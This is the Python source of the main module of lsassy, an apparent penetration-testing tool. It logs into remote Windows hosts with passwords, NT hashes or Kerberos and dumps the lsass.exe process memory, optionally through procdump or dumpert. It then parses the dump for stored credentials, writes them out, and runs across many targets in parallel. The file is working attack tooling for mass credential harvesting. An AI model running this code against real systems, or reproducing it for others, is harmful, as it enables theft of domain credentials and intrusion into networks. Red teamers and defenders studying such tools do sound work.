#!/usr/bin/env python3
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from multiprocessing import Process, RLock
import time

from lsassy.modules.dumper import Dumper
from lsassy.modules.impacketconnection import ImpacketConnection
from lsassy.modules.logger import Logger
from lsassy.modules.parser import Parser
from lsassy.modules.writer import Writer
from lsassy.utils.utils import *

lock = RLock()


class Lsassy:
    def __init__(self,
                 hostname, username, domain="", password="", lmhash="", nthash="",
                 kerberos=False, aesKey="", dc_ip=None,
                 log_options=Logger.Options(),
                 dump_options=Dumper.Options(),
                 parse_options=Parser.Options(),
                 write_options=Writer.Options()
                 ):

        self.conn_options = ImpacketConnection.Options(hostname, domain, username, password, lmhash, nthash, kerberos, aesKey, dc_ip)
        self.log_options = log_options
        self.dump_options = dump_options
        self.parse_options = parse_options
        self.write_options = write_options

        self._target = hostname

        self._log = Logger(self._target, log_options)

        self._conn = None
        self._dumper = None
        self._parser = None
        self._dumpfile = None
        self._credentials = []
        self._writer = None

    def connect(self, options: ImpacketConnection.Options):
        self._conn = ImpacketConnection(options)
        self._conn.set_logger(self._log)
        login_result = self._conn.login()
        if not login_result.success():
            return login_result

        self._log.info("Authenticated")
        return RetCode(ERROR_SUCCESS)

    def dump_lsass(self, options=Dumper.Options()):
        is_admin = self._conn.isadmin()
        if not is_admin.success():
            self._conn.close()
            return is_admin

        self._dumper = Dumper(self._conn, options)
        dump_result = self._dumper.dump()
        if not dump_result.success():
            return dump_result
        self._dumpfile = self._dumper.getfile()

        self._log.info("Process lsass.exe has been dumped")
        return RetCode(ERROR_SUCCESS)

    def parse_lsass(self, options=Dumper.Options()):
        self._parser = Parser(self._dumpfile, options)
        parse_result = self._parser.parse()
        if not parse_result.success():
            return parse_result

        self._credentials = self._parser.get_credentials()
        self._log.info("Process lsass.exe has been parsed")
        return RetCode(ERROR_SUCCESS)

    def write_credentials(self, options=Writer.Options()):
        self._writer = Writer(self._target, self._credentials, self._log, options)
        write_result = self._writer.write()
        if not write_result.success():
            return write_result

        return RetCode(ERROR_SUCCESS)

    def clean(self):
        if self._parser:
            r = self._parser.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._dumper:
            r = self._dumper.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        if self._conn:
            r = self._conn.clean()
            if not r.success():
                lsassy_warn(self._log, r)

        self._log.info("Cleaning complete")

    def get_credentials(self):
        return_code = self.run()
        self._writer = Writer(self._target, self._credentials, self._log, self.write_options)
        ret = {
                "success": True,
                "credentials": self._writer.get_output()
            }
        if not return_code.success():
            ret["success"] = False
            ret["error_code"] = return_code.error_code
            ret["error_msg"] = return_code.error_msg
            ret["error_exception"] = return_code.error_exception

        return ret

    def run(self):
        return_code = ERROR_UNDEFINED
        try:
            return_code = self._run()
        except KeyboardInterrupt as e:
            print("")
            self._log.warn("Quitting gracefully...")
            return_code = RetCode(ERROR_USER_INTERRUPTION)
        except Exception as e:
            return_code = RetCode(ERROR_UNDEFINED, e)
        finally:
            self.clean()
            lsassy_exit(self._log, return_code)
            return return_code

    def _run(self):
        """
        Extract hashes from arguments
        """

        r = self.connect(self.conn_options)
        if not r.success():
            return r
        r = self.dump_lsass(self.dump_options)
        if not r.success():
            return r
        r = self.parse_lsass(self.parse_options)
        if not r.success():
            return r
        r = self.write_credentials(self.write_options)
        if not r.success():
            return r
        return RetCode(ERROR_SUCCESS)


class CLI:
    def __init__(self, target):
        self.conn_options = ImpacketConnection.Options()
        self.log_options = Logger.Options()
        self.dump_options = Dumper.Options()
        self.parse_options = Parser.Options()
        self.write_options = Writer.Options()
        self.lsassy = None
        self.target = target

    def set_options_from_args(self, args):
        # Logger Options
        self.log_options.verbosity = args.v
        self.log_options.quiet = args.quiet

        # Connection Options
        self.conn_options.hostname = self.target
        self.conn_options.domain_name = '' if args.domain is None else args.domain
        self.conn_options.username = '' if args.username is None else args.username
        self.conn_options.kerberos = args.kerberos
        self.conn_options.aes_key = '' if args.aesKey is None else args.aesKey
        self.conn_options.dc_ip = args.dc_ip
        self.conn_options.password = '' if args.password is None else args.password
        if not self.conn_options.password and args.hashes:
            if ":" in args.hashes:
                self.conn_options.lmhash, self.conn_options.nthash = args.hashes.split(":")
            else:
                self.conn_options.lmhash, self.conn_options.nthash = 'aad3b435b51404eeaad3b435b51404ee', args.hashes

        # Dumper Options
        self.dump_options.dumpname = args.dumpname
        self.dump_options.procdump_path = args.procdump
        self.dump_options.dumpert_path = args.dumpert
        self.dump_options.method = args.method
        self.dump_options.timeout = args.timeout

        # Parser Options
        self.parse_options.raw = args.raw

        # Writer Options
        self.write_options.output_file = args.outfile
        self.write_options.format = args.format
        self.write_options.quiet = args.quiet

    def run(self):
        args = get_args()
        self.set_options_from_args(args)
        self.lsassy = Lsassy(
            self.conn_options.hostname,
            self.conn_options.username,
            self.conn_options.domain_name,
            self.conn_options.password,
            self.conn_options.lmhash,
            self.conn_options.nthash,
            self.conn_options.kerberos,
            self.conn_options.aesKey,
            self.conn_options.dc_ip,
            log_options=self.log_options,
            dump_options=self.dump_options,
            parse_options=self.parse_options,
            write_options=self.write_options
        )
        return self.lsassy.run()


def run():
    targets = get_targets(get_args().target)
    # Maximum 256 processes because maximum 256 opened files in python by default
    processes = min(get_args().threads, 256)

    if len(targets) == 1:
        return CLI(targets[0]).run().error_code
    jobs = [Process(target=CLI(target).run) for target in targets]
    try:
        for job in jobs:
            # Checking running processes to avoid reaching --threads limit
            while True:
                counter = sum(1 for j in jobs if j.is_alive())
                if counter >= processes:
                    time.sleep(1)
                else:
                    break
            job.start()
    except KeyboardInterrupt as e:
        print("\nQuitting gracefully...")
        terminate_jobs(jobs)
    finally:
        join_jobs(jobs)

    return 0


if __name__ == '__main__':
    run()
